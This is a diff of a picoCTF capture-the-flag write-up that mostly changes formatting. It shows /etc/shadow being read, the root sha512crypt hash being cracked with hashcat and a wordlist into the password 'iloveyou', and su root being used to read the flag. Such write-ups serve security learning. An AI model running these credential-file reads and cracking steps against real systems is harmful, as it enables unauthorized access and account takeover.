@@ -41,7 +41,9 @@ I jumped straight to the shadow folder and hit it with a the cat function:
 player@challenge:~$ cd /etc
 cd /etc
 player@challenge:/etc$ cat shadow
+
 cat shadow
+
 root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
 daemon:*:19507:0:99999:7:::
 bin:*:19507:0:99999:7:::
@@ -65,23 +67,26 @@ systemd-network:*:19791:0:99999:7:::
 systemd-resolve:*:19791:0:99999:7:::
 messagebus:*:19791:0:99999:7:::
 sshd:*:19791:0:99999:7:::
+
+
 player:$6$BCCW51fi$UI/5W01uG2.6EmxktMtZXbJQwrgDlv213cLwu7RxaIQHnRZXwKZ3yjuyNKf86KlSwbvAOp3YozpNVrBeKW9Ls0:19791:0:99999:7:::
 
 
-there is our root password with sha512crypt (we know this because of the $6$)....run hashcat
-with 1800 for the format and --show to produce the results
+### there is our root password with sha512crypt (we know this because of the $6$)....run hashcat with 1800 for the format and --show to produce the results
 
 ─$ hashcat -a 0 -m 1800 hash /usr/share/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt --show
 $6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:iloveyou
 
 
-now with the root password just su root...enter iloveyou and you have all rights
+### now with the root password just su root...enter iloveyou and you have all rights
 
 player@challenge:/etc$ su root
+
 su root
+
 Password: iloveyou
 
-locate and cat the flag
+### locate and cat the flag
 
 root@challenge:/etc# cd /root
 cd /root
@@ -94,8 +99,11 @@ drwxr-xr-x 1 root root   29 Mar 27 18:14 ..
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
 -rwx------ 1 root root   46 Mar 12 00:18 flag.txt
 -rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
+
 root@challenge:~# cat flag.txt
+
 cat flag.txt
+
 picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
 
 
